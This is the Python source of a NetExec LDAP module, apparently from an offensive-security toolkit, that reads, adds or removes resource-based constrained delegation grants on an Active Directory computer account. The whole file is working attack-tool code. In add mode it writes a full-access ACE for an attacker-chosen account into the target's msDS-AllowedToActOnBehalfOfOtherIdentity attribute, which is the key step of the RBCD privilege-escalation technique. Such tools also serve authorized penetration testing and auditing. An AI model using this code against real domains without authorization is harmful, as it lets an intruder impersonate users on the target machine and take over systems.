"""Read or change one resource-based constrained delegation grant."""

from dataclasses import dataclass, field
from sys import exit

from impacket.ldap import ldapasn1, ldaptypes
from impacket.ldap.ldap import MODIFY_REPLACE
from ldap3.utils.conv import escape_filter_chars

from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.playbooks.results import ActionResult, ResultStatus


class NXCModule:
    name = "rbcd"
    description = "Read, add, or remove a single resource-based constrained delegation grant"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    @dataclass
    class ResultData:
        action: str
        target: str
        source: str | None = None
        target_dn: str | None = None
        source_sid: str | None = None
        target_spns: list[str] = field(default_factory=list)
        before_sids: list[str] = field(default_factory=list)
        after_sids: list[str] = field(default_factory=list)
        modified: bool = False
        completed: bool = False

    result_type = ResultData

    def options(self, context, module_options):
        """TARGET=computer$ ACTION=read|add|remove SOURCE=delegating_account$ TARGET_DN=exact_distinguished_name

        Read is the default. Add/remove require SOURCE. TARGET_DN is an optional
        exact-object assertion, useful when a playbook has already resolved the DN.
        """
        self.target = module_options.get("TARGET", "").strip()
        self.source = module_options.get("SOURCE", "").strip()
        self.action = module_options.get("ACTION", "read").strip().lower()
        self.expected_dn = module_options.get("TARGET_DN", "").strip()
        if not self.target or self.action not in {"read", "add", "remove"} or (self.action != "read" and not self.source):
            context.log.fail("TARGET and ACTION=read|add|remove are required; add/remove also require SOURCE")
            exit(1)

    def lookup(self, connection, account, attributes):
        rows = connection.search(f"(sAMAccountName={escape_filter_chars(account)})", attributes)
        search_error = connection.last_search_error
        entries = []
        for raw in rows:
            if not isinstance(raw, ldapasn1.SearchResultEntry):
                continue
            parsed = parse_result_attributes([raw])[0]
            if parsed.get("sAMAccountName", "").casefold() == account.casefold():
                entries.append((raw, parsed))
        if search_error:
            return None, search_error
        if len(entries) != 1:
            return None, f"Expected one exact account named {account}; found {len(entries)}"
        return entries[0], None

    def descriptor_bytes(self, raw):
        for attribute in raw["attributes"]:
            if str(attribute["type"]).casefold() == "msds-allowedtoactonbehalfofotheridentity":
                values = attribute["vals"].components
                if len(values) != 1:
                    return None, "Expected one RBCD security descriptor"
                return values[0].asOctets(), None
        return None, None

    def empty_descriptor(self):
        descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR()
        descriptor["Revision"] = b"\x01"
        descriptor["Sbz1"] = b"\x00"
        descriptor["Control"] = 32772
        descriptor["OwnerSid"] = ldaptypes.LDAP_SID()
        descriptor["OwnerSid"].fromCanonical("S-1-5-32-544")
        descriptor["GroupSid"] = b""
        descriptor["Sacl"] = b""
        descriptor["Dacl"] = ldaptypes.ACL()
        descriptor["Dacl"]["AclRevision"] = 4
        descriptor["Dacl"]["Sbz1"] = 0
        descriptor["Dacl"]["Sbz2"] = 0
        descriptor["Dacl"].aces = []
        return descriptor

    def allowed_sids(self, descriptor):
        dacl = descriptor["Dacl"]
        if not dacl:
            return []
        return list(dict.fromkeys(ace["Ace"]["Sid"].formatCanonical() for ace in dacl.aces if ace["TypeName"] in ("ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE")))

    def allow_ace(self, sid):
        ace = ldaptypes.ACE()
        ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        ace["AceFlags"] = 0
        ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
        ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
        ace["Ace"]["Mask"]["Mask"] = 983551
        ace["Ace"]["Sid"] = ldaptypes.LDAP_SID()
        ace["Ace"]["Sid"].fromCanonical(sid)
        return ace

    def failure(self, context, connection, data, message):
        context.log.fail(message)
        return ActionResult("ldap", self.name, connection.host, ResultStatus.FAILED, data, error=message)

    def on_login(self, context, connection):
        data = self.ResultData(self.action, self.target, self.source or None)
        found, search_error = self.lookup(connection, self.target, ["sAMAccountName", "distinguishedName", "servicePrincipalName", "msDS-AllowedToActOnBehalfOfOtherIdentity"])
        if search_error:
            return self.failure(context, connection, data, search_error)
        raw, target = found
        data.target_dn = target.get("distinguishedName") or str(raw["objectName"])
        if self.expected_dn and data.target_dn.casefold() != self.expected_dn.casefold():
            return self.failure(context, connection, data, f"TARGET_DN does not match {self.target}: {data.target_dn}")
        spns = target.get("servicePrincipalName", [])
        data.target_spns = spns if isinstance(spns, list) else [spns]
        original, descriptor_error = self.descriptor_bytes(raw)
        if descriptor_error:
            return self.failure(context, connection, data, descriptor_error)
        try:
            descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=original) if original is not None else self.empty_descriptor()
            data.before_sids = self.allowed_sids(descriptor)
        except Exception as e:
            return self.failure(context, connection, data, f"Invalid RBCD security descriptor: {e}")
        if self.source:
            found, search_error = self.lookup(connection, self.source, ["sAMAccountName", "objectSid"])
            if search_error:
                return self.failure(context, connection, data, search_error)
            _, principal = found
            data.source_sid = principal.get("objectSid")
            if not data.source_sid:
                return self.failure(context, connection, data, f"No SID returned for {self.source}")
        if self.action == "read":
            data.after_sids = data.before_sids.copy()
            data.completed = True
            shown = [sid for sid in data.after_sids if not data.source_sid or sid == data.source_sid]
            for sid in shown:
                context.log.highlight(f"{sid} -> {self.target} ({data.target_dn})")
            if not shown:
                context.log.display(f"No matching RBCD grant on {self.target}")
            return ActionResult("ldap", self.name, connection.host, ResultStatus.SUCCESS if shown else ResultStatus.NEGATIVE, data)
        present = data.source_sid in data.before_sids
        if (self.action == "add" and present) or (self.action == "remove" and not present):
            data.after_sids = data.before_sids.copy()
            context.log.display(f"RBCD grant for {self.source} already {'present' if present else 'absent'} on {self.target}")
            return ActionResult("ldap", self.name, connection.host, ResultStatus.NEGATIVE, data)
        try:
            if self.action == "add":
                descriptor["Dacl"].aces.append(self.allow_ace(data.source_sid))
            else:
                descriptor["Dacl"].aces = [ace for ace in descriptor["Dacl"].aces if not (ace["TypeName"] in ("ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE") and ace["Ace"]["Sid"].formatCanonical() == data.source_sid)]
            if not connection.ldap_connection.modify(data.target_dn, {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_REPLACE, [descriptor.getData()])]}):
                raise ValueError("LDAP modify was not acknowledged")
        except Exception as e:
            return self.failure(context, connection, data, str(e) or type(e).__name__)
        data.modified = True
        found, search_error = self.lookup(connection, self.target, ["sAMAccountName", "distinguishedName", "msDS-AllowedToActOnBehalfOfOtherIdentity"])
        if search_error:
            return self.failure(context, connection, data, search_error)
        updated_raw, updated_target = found
        if (updated_target.get("distinguishedName") or str(updated_raw["objectName"])).casefold() != data.target_dn.casefold():
            return self.failure(context, connection, data, "Target DN changed before RBCD readback")
        updated, descriptor_error = self.descriptor_bytes(updated_raw)
        if descriptor_error:
            return self.failure(context, connection, data, descriptor_error)
        try:
            data.after_sids = self.allowed_sids(ldaptypes.SR_SECURITY_DESCRIPTOR(data=updated)) if updated is not None else []
        except Exception as e:
            return self.failure(context, connection, data, f"Invalid RBCD readback descriptor: {e}")
        data.completed = (data.source_sid in data.after_sids) == (self.action == "add")
        if not data.completed:
            return self.failure(context, connection, data, "RBCD readback did not confirm the requested change")
        context.log.success(f"RBCD {self.action} confirmed: {self.source} -> {self.target}")
        return ActionResult("ldap", self.name, connection.host, ResultStatus.SUCCESS, data)
